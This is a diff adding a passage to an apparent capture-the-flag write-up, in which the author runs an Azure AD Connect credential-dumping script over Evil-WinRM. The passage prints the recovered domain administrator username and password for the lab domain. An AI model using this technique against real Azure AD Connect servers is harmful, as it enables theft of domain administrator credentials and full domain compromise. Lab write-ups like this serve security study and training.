@@ -295,4 +295,20 @@ d-----         1/2/2020   2:53 PM                Microsoft Azure AD Sync
 
 ...[SNIP]...
 ```
-I see that Azure AD Connect is installed, fr
+I see that Azure AD Connect is installed, from past experience i was aware of this attack path!
+
+```python
+*Evil-WinRM* PS C:\Users\mhope\Documents> .\azure-creds.ps1
+Attempting connection: Data Source=(localdb)\.\ADSync;Initial Catalog=ADSync;Integrated Security=True
+Error connecting to SQL database. Trying next...
+Exception Message: A network-related or instance-specific error occurred while establishing a connection to SQL Server. The server was not found or was not accessible. Verify that the instance name is correct and that SQL Server is configured to allow remote connections. (provider: SQL Network Interfaces, error: 52 - Unable to locate a Local Database Runtime installation. Verify that SQL Server Express is properly installed and that the Local Database Runtime feature is enabled.)
+Attempting connection: Data Source=localhost;Initial Catalog=ADSync;Integrated Security=True
+Connection successful!
+Loading mcrypt.dll from: C:\Program Files\Microsoft Azure AD Sync\Bin\mcrypt.dll
+Domain: MEGABANK.LOCAL
+Username: administrator
+Password: d0m@in4dminyeah!
+*Evil-WinRM* PS C:\Users\mhope\Documents>
+```
+Using the tool from github i found listed earlier i can dump the credentials of the administrator!
+
